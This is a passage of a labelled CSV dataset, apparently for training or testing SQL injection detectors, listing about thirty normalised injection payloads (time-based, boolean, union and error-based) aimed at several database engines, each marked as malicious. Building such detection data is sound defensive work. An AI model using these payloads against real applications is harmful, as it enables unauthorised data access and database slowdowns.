row_index,payload_norm,label,sqli_type_hint
5040,"1%' or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and '%' = '",1,
5041,-7034' ) ) ) union all select 4023#,1,
5042,"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) and ( ( ( 'lijy' = 'lijy",1,
5043,"1 ) as adzj where 5575 = 5575 or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",1,
5044,"1%"" or 7417 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,
5045,select ( case when ( 8350 = 7872 ) then 8350 else 8350* ( select 8350 from information_schema.character_sets ) end ) #,1,
5046,"-4287%"" ) ) union all select 9074,9074,9074,9074,9074,9074,9074,9074,9074,9074#",1,
5047,1' ) ) or ( select * from ( select ( sleep ( 5 ) ) ) sddo ) #,1,
5048,"1%"" ) ) or 4915 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1,
5049,"1"" or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ""ctdc"" = ""ctdc",1,
5050,"1%"" and 3580 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1,
5051,select ( case when ( 8362 = 7572 ) then 8362 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual--,1,
5052,"1"" where 2886 = 2886",1,
5053,"1' where 6417 = 6417 or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1,
5054,-8777%' ) ) ) or ( 3934 = 2025 ) *2025 and ( ( ( '%' = ',1,
5055,"1%"" ) ) ) and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and ( ( ( ""%"" = """,1,
5056,"1'+ ( select 'qzcx' where 9524 = 9524 and elt ( 3069 = 8430,8430 ) ) +'",1,
5057,"1 ) where 8734 = 8734 procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75 ) ) ) ) ) ,1 ) #",1,
5058,"1%"" ) ) ) rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) and ( ( ( ""%"" = """,1,
5059,"-7111%"" union all select 6083,6083,6083,6083,6083,6083--",1,
5060,"1%' union all select null,null#",1,
5061,"1' and elt ( 1210 = 1210,sleep ( 5 ) ) and 'yhpp' like 'yhpp",1,
5062,"1"" ) ) or sleep ( 5 ) #",1,
5063,"1' ) ) as pstn where 6691 = 6691 and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --",1,
5064,"1"" ) ) or elt ( 6272 = 6272,sleep ( 5 ) ) and ( ( ""chvi"" like ""chvi",1,
5065,-2181' ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( 'wyez' = 'wyez,1,
5066,"1'|| ( select 'pzto' from dual where 7338 = 7338 and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) ) ||'",1,
5067,"1' ) ) as cgey where 2130 = 2130 and make_set ( 7914 = 4032,4032 ) --",1,
5068,"-7078'|| ( select 'lcza' where 5076 = 5076 union all select 5076,5076,5076,5076,5076,5076,5076,5076,5076,5076--",1,
5069,1'+ ( select 'iify' where 6257 = 6257 or 6793 = ( select 6793 from pg_sleep ( 5 ) ) ) +',1,
